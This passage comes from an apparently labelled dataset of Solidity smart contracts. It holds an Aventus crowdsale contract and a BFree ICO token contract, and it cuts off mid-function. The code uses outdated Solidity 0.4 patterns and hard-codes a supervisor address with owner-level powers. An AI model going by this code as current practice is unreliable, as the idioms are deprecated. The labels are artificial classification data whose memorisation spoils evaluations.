hsub(x, y);\r\r\n    }\r\r\n\r\r\n    function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = cast((uint256(x) * y + RAY \/ 2) \/ RAY);\r\r\n    }\r\r\n\r\r\n    function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = cast((uint256(x) * RAY + y \/ 2) \/ y);\r\r\n    }\r\r\n\r\r\n    function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\r\r\n        \/\/ This famous algorithm is called \"exponentiation by squaring\"\r\r\n        \/\/ and calculates x^n with x as fixed-point and n as regular unsigned.\r\r\n        \/\/\r\r\n        \/\/ It&#39;s O(log n), instead of O(n) for naive repeated multiplication.\r\r\n        \/\/\r\r\n        \/\/ These facts are why it works:\r\r\n        \/\/\r\r\n        \/\/  If n is even, then x^n = (x^2)^(n\/2).\r\r\n        \/\/  If n is odd,  then x^n = x * x^(n-1),\r\r\n        \/\/   and applying the equation for even x gives\r\r\n        \/\/    x^n = x * (x^2)^((n-1) \/ 2).\r\r\n        \/\/\r\r\n        \/\/  Also, EVM division is flooring and\r\r\n        \/\/    floor[(n-1) \/ 2] = floor[n \/ 2].\r\r\n\r\r\n        z = n % 2 != 0 ? x : RAY;\r\r\n\r\r\n        for (n \/= 2; n != 0; n \/= 2) {\r\r\n            x = rmul(x, x);\r\r\n\r\r\n            if (n % 2 != 0) {\r\r\n                z = rmul(z, x);\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hmin(x, y);\r\r\n    }\r\r\n    function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hmax(x, y);\r\r\n    }\r\r\n\r\r\n    function cast(uint256 x) constant internal returns (uint128 z) {\r\r\n        assert((z = uint128(x)) == x);\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\ncontract DSStop is DSAuth, DSNote {\r\r\n\r\r\n    bool public stopped;\r\r\n\r\r\n    modifier stoppable {\r\r\n        assert (!stopped);\r\r\n        _;\r\r\n    }\r\r\n    function stop() auth note {\r\r\n        stopped = true;\r\r\n    }\r\r\n    function start() auth note {\r\r\n        stopped = false;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\ncontract ERC20 {\r\r\n    function totalSupply() constant returns (uint supply);\r\r\n    function balanceOf( address who ) constant returns (uint value);\r\r\n    function allowance( address owner, address spender ) constant returns (uint _allowance);\r\r\n\r\r\n    function transfer( address to, uint value) returns (bool ok);\r\r\n    function transferFrom( address from, address to, uint value) returns (bool ok);\r\r\n    function approve( address spender, uint value ) returns (bool ok);\r\r\n\r\r\n    event Transfer( address indexed from, address indexed to, uint value);\r\r\n    event Approval( address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\ncontract DSTokenBase is ERC20, DSMath {\r\r\n    uint256                                            _supply;\r\r\n    mapping (address => uint256)                       _balances;\r\r\n    mapping (address => mapping (address => uint256))  _approvals;\r\r\n    \r\r\n    function DSTokenBase(uint256 supply) {\r\r\n        _balances[msg.sender] = supply;\r\r\n        _supply = supply;\r\r\n    }\r\r\n    \r\r\n    function totalSupply() constant returns (uint256) {\r\r\n        return _supply;\r\r\n    }\r\r\n    function balanceOf(address src) constant returns (uint256) {\r\r\n        return _balances[src];\r\r\n    }\r\r\n    function allowance(address src, address guy) constant returns (uint256) {\r\r\n        return _approvals[src][guy];\r\r\n    }\r\r\n    \r\r\n    function transfer(address dst, uint wad) returns (bool) {\r\r\n        assert(_balances[msg.sender] >= wad);\r\r\n        \r\r\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\r\r\n        _balances[dst] = add(_balances[dst], wad);\r\r\n        \r\r\n        Transfer(msg.sender, dst, wad);\r\r\n        \r\r\n        return true;\r\r\n    }\r\r\n    \r\r\n    function transferFrom(address src, address dst, uint wad) returns (bool) {\r\r\n        assert(_balances[src] >= wad);\r\r\n        assert(_approvals[src][msg.sender] >= wad);\r\r\n        \r\r\n        _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\r\r\n        _balances[src] = sub(_balances[src], wad);\r\r\n        _balances[dst] = add(_balances[dst], wad);\r\r\n        \r\r\n        Transfer(src, dst, wad);\r\r\n        \r\r\n        return true;\r\r\n    }\r\r\n    \r\r\n    function approve(address guy, uint256 wad) returns (bool) {\r\r\n        _approvals[msg.sender][guy] = wad;\r\r\n        \r\r\n        Approval(msg.sender, guy, wad);\r\r\n        \r\r\n        return true;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\ncontract DSToken is DSTokenBase(0), DSStop {\r\r\n\r\r\n    bytes32  public  symbol;\r\r\n    uint256  public  decimals = 18; \/\/ standard token precision. override to customize\r\r\n\r\r\n    function DSToken(bytes32 symbol_) {\r\r\n        symbol = symbol_;\r\r\n    }\r\r\n\r\r\n    function transfer(address dst, uint wad) stoppable note returns (bool) {\r\r\n        return super.transfer(dst, wad);\r\r\n    }\r\r\n    function transferFrom(\r\r\n        address src, address dst, uint wad\r\r\n    ) stoppable note returns (bool) {\r\r\n        return super.transferFrom(src, dst, wad);\r\r\n    }\r\r\n    function approve(address guy, uint wad) stoppable note returns (bool) {\r\r\n        return super.approve(guy, wad);\r\r\n    }\r\r\n\r\r\n    function push(address dst, uint128 wad) returns (bool) {\r\r\n        return transfer(dst, wad);\r\r\n    }\r\r\n    function pull(address src, uint128 wad) returns (bool) {\r\r\n        return transferFrom(src, msg.sender, wad);\r\r\n    }\r\r\n\r\r\n    function mint(uint128 wad) auth stoppable note {\r\r\n        _balances[msg.sender] = add(_balances[msg.sender], wad);\r\r\n        _supply = add(_supply, wad);\r\r\n    }\r\r\n    function burn(uint128 wad) auth stoppable note {\r\r\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\r\r\n        _supply = sub(_supply, wad);\r\r\n    }\r\r\n\r\r\n    \/\/ Optional token name\r\r\n\r\r\n    bytes32   public  name = \"\";\r\r\n    \r\r\n    function setName(bytes32 name_) auth {\r\r\n        name = name_;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\ncontract AVTSale is DSMath, DSNote, DSExec {\r\r\n    Whitelist public whitelist;\r\r\n    DSToken public avt;\r\r\n\r\r\n    \/\/ AVT PRICES (ETH\/AVT)\r\r\n    uint public constant PRIVATE_SALE_PRICE = 110;\r\r\n    uint public constant WHITELIST_SALE_PRICE = 92;\r\r\n    uint public constant PUBLIC_SALE_PRICE = 92;\r\r\n\r\r\n    uint128 public constant CROWDSALE_SUPPLY = 10000000 ether;\r\r\n    uint public constant LIQUID_TOKENS = 2500000 ether;\r\r\n    uint public constant ILLIQUID_TOKENS = 1500000 ether;\r\r\n\r\r\n    \/\/ PURCHASE LIMITS\r\r\n    uint public constant PRIVATE_SALE_LIMIT = 3000000 ether;\r\r\n    uint public constant WHITELIST_SALE_LIMIT = 5000000 ether;\r\r\n    uint public constant PUBLIC_SALE_LIMIT = 6000000 ether;\r\r\n\r\r\n    uint public privateStart;\r\r\n    uint public whitelistStart;\r\r\n    uint public publicStart;\r\r\n    uint public publicEnd;\r\r\n\r\r\n    address public aventus;\r\r\n    address public privateBuyer;\r\r\n\r\r\n    uint public sold;\r\r\n\r\r\n\r\r\n    function AVTSale(uint privateStart_, address aventus_, address privateBuyer_, Whitelist whitelist_) {\r\r\n        avt = new DSToken(\"AVT\");\r\r\n        \r\r\n        aventus = aventus_;\r\r\n        privateBuyer = privateBuyer_;\r\r\n        whitelist = whitelist_;\r\r\n        \r\r\n        privateStart = privateStart_;\r\r\n        whitelistStart = privateStart + 2 days;\r\r\n        publicStart = whitelistStart + 1 days;\r\r\n        publicEnd = publicStart + 7 days;\r\r\n\r\r\n        avt.mint(CROWDSALE_SUPPLY);\r\r\n        avt.setOwner(aventus);\r\r\n        avt.transfer(aventus, LIQUID_TOKENS);\r\r\n    }\r\r\n\r\r\n    \/\/ overrideable for easy testing\r\r\n    function time() constant returns (uint) {\r\r\n        return now;\r\r\n    }\r\r\n\r\r\n    function() payable note {\r\r\n        var (rate, limit) = getRateLimit();\r\r\n\r\r\n        uint prize = mul(msg.value, rate);\r\r\n\r\r\n        assert(add(sold, prize) <= limit);\r\r\n\r\r\n        sold = add(sold, prize);\r\r\n\r\r\n        avt.transfer(msg.sender, prize);\r\r\n        exec(aventus, msg.value); \/\/ send the ETH to multisig\r\r\n    }\r\r\n\r\r\n    function getRateLimit() private constant returns (uint, uint) {\r\r\n        uint t = time();\r\r\n\r\r\n        if (t >= privateStart && t < whitelistStart) {\r\r\n            assert (msg.sender == privateBuyer);\r\r\n\r\r\n            return (PRIVATE_SALE_PRICE, PRIVATE_SALE_LIMIT);\r\r\n        }\r\r\n        else if (t >= whitelistStart && t < publicStart) {\r\r\n            uint allowance = whitelist.accepted(msg.sender);\r\r\n\r\r\n            assert (allowance >= msg.value);\r\r\n\r\r\n            whitelist.accept(msg.sender, allowance - msg.value);\r\r\n\r\r\n            return (WHITELIST_SALE_PRICE, WHITELIST_SALE_LIMIT);\r\r\n        }\r\r\n        else if (t >= publicStart && t < publicEnd)\r\r\n            return (PUBLIC_SALE_PRICE, PUBLIC_SALE_LIMIT);\r\r\n\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    function claim() {\r\r\n        assert(time() >= publicStart + 1 years);\r\r\n\r\r\n        avt.transfer(aventus, ILLIQUID_TOKENS);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.16;\r\r\n\r\r\n \/\/ ERC Token Standard #20 Interface\r\r\n \/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n\r\r\n contract ERC20Interface {\r\r\n\t\/\/\/ @notice Get the total token supply\r\r\n\tfunction totalSupply() constant returns (uint256 totalAmount);\r\r\n\r\r\n\t\/\/\/ @notice  Get the account balance of another account with address _owner\r\r\n\tfunction balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n\t\/\/\/ @notice  Send _value amount of tokens to address _to\r\r\n\tfunction transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/\/ @notice  Send _value amount of tokens from address _from to address _to\r\r\n\tfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/\/ @notice  Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n\t\/\/\/ @notice  If this function is called again it overwrites the current allowance with _value.\r\r\n\t\/\/\/ @notice  this function is required for some DEX functionality\r\r\n\tfunction approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/\/ @notice  Returns the amount which _spender is still allowed to withdraw from _owner\r\r\n\tfunction allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n\t\/\/\/ @notice  Triggered when tokens are transferred.\r\r\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n\t\/\/\/ @notice  Triggered whenever approve(address _spender, uint256 _value) is called.\r\r\n\tevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n }\r\r\n \r\r\n contract owned{\r\r\n\taddress public owner;\r\r\n\taddress constant supervisor  = 0x318B0f768f5c6c567227AA50B51B5b3078902f8C;\r\r\n\t\r\r\n\tfunction owned(){\r\r\n\t\towner = msg.sender;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Functions with this modifier can only be executed by the owner\r\r\n\tmodifier isOwner {\r\r\n\t\tassert(msg.sender == owner || msg.sender == supervisor);\r\r\n\t\t_;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/\/ @notice Transfer the ownership of this contract\r\r\n\tfunction transferOwnership(address newOwner);\r\r\n\t\r\r\n\tevent ownerChanged(address whoTransferredOwnership, address formerOwner, address newOwner);\r\r\n }\r\r\n\r\r\ncontract BFreeContract is ERC20Interface, owned{\r\r\n\r\r\n\tstring public constant name = \"BFree\";\r\r\n\tstring public constant symbol = \"BFR\";\r\r\n\tuint public constant decimals = 0;\r\r\n\tuint256 public _totalSupply = 2240000;\r\r\n\tuint256 public icoMin = 300000;\t\t\t\t\t\/\/ = 300000; amount is in Tokens, 1.800.000\r\r\n\tuint256 public preIcoLimit = 600000;\t\t\t\/\/ = 600000; amount is in tokens, 3.600.000\r\r\n\tuint256 public countHolders = 0;\t\t\t\t\/\/ count how many unique holders have tokens\r\r\n\tuint256 public amountOfInvestments = 0;\t\/\/ amount of collected wei\r\r\n\t\r\r\n\tuint256 preICOprice;\t\t\t\t\t\t\t\t\t\/\/ price of 1 token in weis for the preICO time\r\r\n\tuint256 ICOprice;\t\t\t\t\t\t\t\t\t\t\/\/ price of 1 token in weis for the ICO time\r\r\n\tuint256 public currentTokenPrice;\t\t\t\t\/\/ current token price in weis\r\r\n\tuint256 public sellPrice;\t\t\t\t\t\t\t\t\/\/ buyback price of one token in weis\r\r\n\t\r\r\n\tbool public preIcoIsRunning;\r\r\n\tbool public minimalGoalReached;\r\r\n\tbool public icoIsClosed;\r\r\n\tbool icoExitIsPossible;\r\r\n\t\r\r\n\r\r\n\t\/\/Balances for each account\r\r\n\tmapping (address => uint256) public tokenBalanceOf;\r\r\n\r\r\n\t\/\/ Owner of account approves the transfer of an amount to another account\r\r\n\tmapping(address => mapping (address => uint256)) allowed;\r\r\n\t\r\r\n\t\/\/list with information about frozen accounts\r\r\n\tmapping(address => bool) frozenAccount;\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent FrozenFunds(address initiator, address account, string status);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent BonusChanged(uint8 bonusOld, uint8 bonusNew);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent minGoalReached(uint256 minIcoAmount, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent preIcoEnded(uint256 preIcoAmount, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent priceUpdated(uint256 oldPrice, uint256 newPrice, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent withdrawed(address _to, uint256 summe, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent deposited(address _from, uint256 summe, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent orderToTransfer(address initiator, address _from, address _to, uint256 summe, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent tokenCreated(address _creator, uint256 summe, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent tokenDestroyed(address _destroyer, uint256 summe, string notice);\r\r\n\t\r\r\n\t\/\/this generate a public event on a blockchain that will notify clients\r\r\n\tevent icoStatusUpdated(address _initiator, string status);\r\r\n\r\r\n\t\/\/\/ @notice Constructor of the contract\r\r\n\tfunction BFreeContract() {\r\r\n\t\tpreIcoIsRunning = true;\r\r\n\t\tminimalGoalReached = false;\r\r\n\t\ticoExitIsPossible = false;\r\r\n\t\ticoIsClosed = false;\r\r\n\t\ttokenBalanceOf[this] += _totalSupply;\r\r\n\t\tallowed[this][owner] = _totalSupply;\r\r\n\t\tallowed[this][supervisor] = _totalSupply;\r\r\n\t\tcurrentTokenPrice = 0.024340770791075100 * 1 ether;\t\/\/ initial price of 1 Token\r\r\n\t\tpreICOprice = 0.024340770791075100 * 1 ether; \t\t\t\/\/ price of 1 token in weis for the preICO time, ca.6,- Euro\r\r\n\t\tICOprice = 0.040567951318458400 * 1 ether;\t\t\t\t\/\/ price of 1 token in weis for the ICO time, ca.10,- Euro\r\r\n\t\tsellPrice = 0;\r\r\n\t\tupdatePrices();\r\r\n\t}\r\r\n\r\r\n\tfunction () payable {\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\tif(msg.value > 0 && !frozenAccount[msg.sender]) {\r\r\n\t\t\tbuyToken();\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Returns a whole amount of tokens\r\r\n\tfunction totalSupply() constant returns (uint256 totalAmount) {\r\r\n\t\ttotalAmount = _totalSupply;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice What is the balance of a particular account?\r\r\n\tfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n\t\treturn tokenBalanceOf[_owner];\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Shows how much tokens _spender can spend from _owner address\r\r\n\tfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n\t\treturn allowed[_owner][_spender];\r\r\n\t}\r\r\n\t\r\r\n\t\/\/\/ @notice Calculates amount of weis needed to buy more than one token\r\r\n\t\/\/\/ @param howManyTokenToBuy - Amount of tokens to calculate\r\r\n\tfunction calculateTheEndPrice(uint256 howManyTokenToBuy) constant returns (uint256 summarizedPriceInWeis) {\r\r\n\t\tif(howManyTokenToBuy > 0) {\r\r\n\t\t\tsummarizedPriceInWeis = howManyTokenToBuy * currentTokenPrice;\r\r\n\t\t}else {\r\r\n\t\t\tsummarizedPriceInWeis = 0;\r\r\n\t\t}\r\r\n\t}\r\r\n\t\r\r\n\t\/\/\/ @notice Shows if account is frozen\r\r\n\t\/\/\/ @param account - Accountaddress to check\r\r\n\tfunction checkFrozenAccounts(address account) constant returns (bool accountIsFrozen) {\r\r\n\t\taccountIsFrozen = frozenAccount[account];\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Buy tokens from contract by sending ether\r\r\n\tfunction buy() payable public {\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(msg.value > 0);\r\r\n\t\tbuyToken();\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Sell tokens and receive ether from contract\r\r\n\tfunction sell(uint256 amount) {\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] >= amount);         \t\/\/ checks if the sender has enough to sell\r\r\n\t\trequire(amount > 0);\r\r\n\t\trequire(sellPrice > 0);\r\r\n\t\t_transfer(msg.sender, this, amount);\r\r\n\t\tuint256 revenue = amount * sellPrice;\r\r\n\t\trequire(this.balance >= revenue);\r\r\n\t\tmsg.sender.transfer(revenue);                \t\t\/\/ sends ether to the seller: it&#39;s important to do this last to prevent recursion attacks\r\r\n\t}\r\r\n\t\r\r\n\t\/\/\/ @notice Allow user to sell maximum possible amount of tokens, depend on ether amount on contract\r\r\n\tfunction sellMaximumPossibleAmountOfTokens() {\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] > 0);\r\r\n\t\trequire(this.balance > sellPrice);\r\r\n\t\tif(tokenBalanceOf[msg.sender] * sellPrice <= this.balance) {\r\r\n\t\t\tsell(tokenBalanceOf[msg.sender]);\r\r\n\t\t}else {\r\r\n\t\t\tsell(this.balance \/ sellPrice);\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Transfer amount of tokens from own wallet to someone else\r\r\n\tfunction transfer(address _to, uint256 _value) returns (bool success) {\r\r\n\t\tassert(msg.sender != address(0));\r\r\n\t\tassert(_to != address(0));\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(!frozenAccount[_to]);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] >= _value);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] - _value < tokenBalanceOf[msg.sender]);\r\r\n\t\trequire(tokenBalanceOf[_to] + _value > tokenBalanceOf[_to]);\r\r\n\t\trequire(_value > 0);\r\r\n\t\t_transfer(msg.sender, _to, _value);\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice  Send _value amount of tokens from address _from to address _to\r\r\n\t\/\/\/ @notice  The transferFrom method is used for a withdraw workflow, allowing contracts to send\r\r\n\t\/\/\/ @notice  tokens on your behalf, for example to \"deposit\" to a contract address and\/or to charge\r\r\n\t\/\/\/ @notice  fees in sub-currencies; the command should fail unless the _from account has\r\r\n\t\/\/\/ @notice  deliberately authorized the sender of the message via some mechanism; we propose\r\r\n\t\/\/\/ @notice  these standardized APIs for approval:\r\r\n\tfunction transferFrom(address _from,\taddress _to,\tuint256 _value) returns (bool success) {\r\r\n\t\tassert(msg.sender != address(0));\r\r\n\t\tassert(_from != address(0));\r\r\n\t\tassert(_to != address(0));\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(!frozenAccount[_from]);\r\r\n\t\trequire(!frozenAccount[_to]);\r\r\n\t\trequire(tokenBalanceOf[_from] >= _value);\r\r\n\t\trequire(allowed[_from][msg.sender] >= _value);\r\r\n\t\trequire(tokenBalanceOf[_from] - _value < tokenBalanceOf[_from]);\r\r\n\t\trequire(tokenBalanceOf[_to] + _value > tokenBalanceOf[_to]);\r\r\n\t\trequire(_value > 0);\r\r\n\t\torderToTransfer(msg.sender, _from, _to, _value, \"Order to transfer tokens from allowed account\");\r\r\n\t\t_transfer(_from, _to, _value);\r\r\n\t\tallowed[_from][msg.sender] -= _value;\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n\t\/\/\/ @notice If this function is called again it overwrites the current allowance with _value.\r\r\n\tfunction approve(address _spender, uint256 _value) returns (bool success) {\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\tassert(_spender != address(0));\r\r\n\t\trequire(_value >= 0);\r\r\n\t\tallowed[msg.sender][_spender] = _value;\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Check if minimal goal of ICO is reached\r\r\n\tfunction checkMinimalGoal() internal {\r\r\n\t\tif(tokenBalanceOf[this] <= _totalSupply - icoMin) {\r\r\n\t\t\tminimalGoalReached = true;\r\r\n\t\t\tminGoalReached(icoMin, \"Minimal goal of ICO is reached!\");\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Check if preICO is ended\r\r\n\tfunction checkPreIcoStatus() internal {\r\r\n\t\tif(tokenBalanceOf[this] <= _totalSupply - preIcoLimit) {\r\r\n\t\t\tpreIcoIsRunning = false;\r\r\n\t\t\tpreIcoEnded(preIcoLimit, \"Token amount for preICO sold!\");\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Processing each buying\r\r\n\tfunction buyToken() internal {\r\r\n\t\tuint256 value = msg.value;\r\r\n\t\taddress sender = msg.sender;\r\r\n\t\trequire(!icoIsClosed);\r\r\n\t\trequire(!frozenAccount[sender]);\r\r\n\t\trequire(value > 0);\r\r\n\t\trequire(currentTokenPrice > 0);\r\r\n\t\tuint256 amount = value \/ currentTokenPrice;\t\t\t\/\/ calculates amount of tokens\r\r\n\t\tuint256 moneyBack = value - (amount * currentTokenPrice);\r\r\n\t\trequire(tokenBalanceOf[this] >= amount);              \t\t\/\/ checks if contract has enough to sell\r\r\n\t\tamountOfInvestments = amountOfInvestments + (value - moneyBack);\r\r\n\t\tupdatePrices();\r\r\n\t\t_transfer(this, sender, amount);\r\r\n\t\tif(!minimalGoalReached) {\r\r\n\t\t\tcheckMinimalGoal();\r\r\n\t\t}\r\r\n\t\tif(moneyBack > 0) {\r\r\n\t\t\tsender.transfer(moneyBack);\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Internal transfer, can only be called by this contract\r\r\n\tfunction _transfer(address _from, address _to, uint256 _value) internal {\r\r\n\t\tassert(_from != address(0));\r\r\n\t\tassert(_to != address(0));\r\r\n\t\trequire(_value > 0);\r\r\n\t\trequire(tokenBalanceOf[_from] >= _value);\r\r\n\t\trequire(tokenBalanceOf[_to] + _value > tokenBalanceOf[_to]);\r\r\n\t\trequire(!frozenAccount[_from]);\r\r\n\t\trequire(!frozenAccount[_to]);\r\r\n\t\tif(tokenBalanceOf[_to] == 0){\r\r\n\t\t\tcountHolders += 1;\r\r\n\t\t}\r\r\n\t\ttokenBalanceOf[_from] -= _value;\r\r\n\t\tif(tokenBalanceOf[_from] == 0){\r\r\n\t\t\tcountHolders -= 1;\r\r\n\t\t}\r\r\n\t\ttokenBalanceOf[_to] += _value;\r\r\n\t\tallowed[this][owner] = tokenBalanceOf[this];\r\r\n\t\tallowed[this][supervisor] = tokenBalanceOf[this];\r\r\n\t\tTransfer(_from, _to, _value);\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Set current ICO prices in wei for one token\r\r\n\tfunction updatePrices() internal {\r\r\n\t\tuint256 oldPrice = currentTokenPrice;\r\r\n\t\tif(preIcoIsRunning) {\r\r\n\t\t\tcheckPreIcoStatus();\r\r\n\t\t}\r\r\n\t\tif(preIcoIsRunning) {\r\r\n\t\t\tcurrentTokenPrice = preICOprice;\r\r\n\t\t}else{\r\r\n\t\t\tcurrentTokenPrice = ICOprice;\r\r\n\t\t}\r\r\n\t\t\r\r\n\t\tif(oldPrice != currentTokenPrice) {\r\r\n\t\t\tpriceUpdated(oldPrice, currentTokenPrice, \"Token price updated!\");\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Set current preICO price in wei for one token\r\r\n\t\/\/\/ @param priceForPreIcoInWei - is the amount in wei for one token\r\r\n\tfunction setPreICOPrice(uint256 priceForPreIcoInWei) isOwner {\r\r\n\t\trequire(priceForPreIcoInWei > 0);\r\r\n\t\trequire(preICOprice != priceForPreIcoInWei);\r\r\n\t\tpreICOprice = priceForPreIcoInWei;\r\r\n\t\tupdatePrices();\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Set current ICO price in wei for one token\r\r\n\t\/\/\/ @param priceForIcoInWei - is the amount in wei for one token\r\r\n\tfunction setICOPrice(uint256 priceForIcoInWei) isOwner {\r\r\n\t\trequire(priceForIcoInWei > 0);\r\r\n\t\trequire(ICOprice != priceForIcoInWei);\r\r\n\t\tICOprice = priceForIcoInWei;\r\r\n\t\tupdatePrices();\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Set both prices at the same time\r\r\n\t\/\/\/ @param priceForPreIcoInWei - Price of the token in pre ICO\r\r\n\t\/\/\/ @param priceForIcoInWei - Price of the token in ICO\r\r\n\tfunction setPrices(uint256 priceForPreIcoInWei, uint256 priceForIcoInWei) isOwner {\r\r\n\t\trequire(priceForPreIcoInWei > 0);\r\r\n\t\trequire(priceForIcoInWei > 0);\r\r\n\t\tpreICOprice = priceForPreIcoInWei;\r\r\n\t\tICOprice = priceForIcoInWei;\r\r\n\t\tupdatePrices();\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Set the current sell price in wei for one token\r\r\n\t\/\/\/ @param priceInWei - is the amount in wei for one token\r\r\n\tfunction setSellPrice(uint256 priceInWei) isOwner {\r\r\n\t\trequire(priceInWei >= 0);\r\r\n\t\tsellPrice = priceInWei;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice &#39;freeze? Prevent | Allow&#39; &#39;account&#39; from sending and receiving tokens\r\r\n\t\/\/\/ @param account - address to be frozen\r\r\n\t\/\/\/ @param freeze - select is the account frozen or not\r\r\n\tfunction freezeAccount(address account, bool freeze) isOwner {\r\r\n\t\trequire(account != owner);\r\r\n\t\trequire(account != supervisor);\r\r\n\t\tfrozenAccount[account] = freeze;\r\r\n\t\tif(freeze) {\r\r\n\t\t\tFrozenFunds(msg.sender, account, \"Account set frozen!\");\r\r\n\t\t}else {\r\r\n\t\t\tFrozenFunds(msg.sender, account, \"Account set free for use!\");\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Create an amount of token\r\r\n\t\/\/\/ @param amount - token to create\r\r\n\tfunction mintToken(uint256 amount) isOwner {\r\r\n\t\trequire(amount > 0);\r\r\n\t\trequire(tokenBalanceOf[this] <= icoMin);\t\/\/ owner can create token only if the initial amount is strongly not enough to supply and demand ICO\r\r\n\t\trequire(_totalSupply + amount > _totalSupply);\r\r\n\t\trequire(tokenBalanceOf[this] + amount > tokenBalanceOf[this]);\r\r\n\t\t_totalSupply += amount;\r\r\n\t\ttokenBalanceOf[this] += amount;\r\r\n\t\tallowed[this][owner] = tokenBalanceOf[this];\r\r\n\t\tallowed[this][supervisor] = tokenBalanceOf[this];\r\r\n\t\ttokenCreated(msg.sender, amount, \"Additional tokens created!\");\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Destroy an amount of token\r\r\n\t\/\/\/ @param amount - token to destroy\r\r\n\tfunction destroyToken(uint256 amount) isOwner {\r\r\n\t\trequire(amount > 0);\r\r\n\t\trequire(tokenBalanceOf[this] >= amount);\r\r\n\t\trequire(_totalSupply >= amount);\r\r\n\t\trequire(tokenBalanceOf[this] - amount >= 0);\r\r\n\t\trequire(_totalSupply - amount >= 0);\r\r\n\t\ttokenBalanceOf[this] -= amount;\r\r\n\t\t_totalSupply -= amount;\r\r\n\t\tallowed[this][owner] = tokenBalanceOf[this];\r\r\n\t\tallowed[this][supervisor] = tokenBalanceOf[this];\r\r\n\t\ttokenDestroyed(msg.sender, amount, \"An amount of tokens destroyed!\");\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Transfer the ownership to another account\r\r\n\t\/\/\/ @param newOwner - address who get the ownership\r\r\n\tfunction transferOwnership(address newOwner) isOwner {\r\r\n\t\tassert(newOwner != address(0));\r\r\n\t\taddress oldOwner = owner;\r\r\n\t\towner = newOwner;\r\r\n\t\townerChanged(msg.sender, oldOwner, 